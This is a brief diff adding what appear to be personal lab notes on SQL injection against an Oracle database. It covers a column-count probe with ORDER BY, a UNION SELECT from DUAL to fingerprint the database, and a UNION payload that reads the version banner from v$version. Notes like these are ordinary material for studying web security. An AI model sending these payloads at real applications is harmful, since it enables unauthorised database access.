@@ -1,0 +1,14 @@
+
+
+' order by 3 -- -> internal server error
+
+3 - 1 = 2
+
+' UNION SELECT 'a', 'a' from DUAL-- -> Oracle database
+
+SELECT banner FROM v$version
+
+' UNION SELECT banner, NULL from v$version--
+
+
+
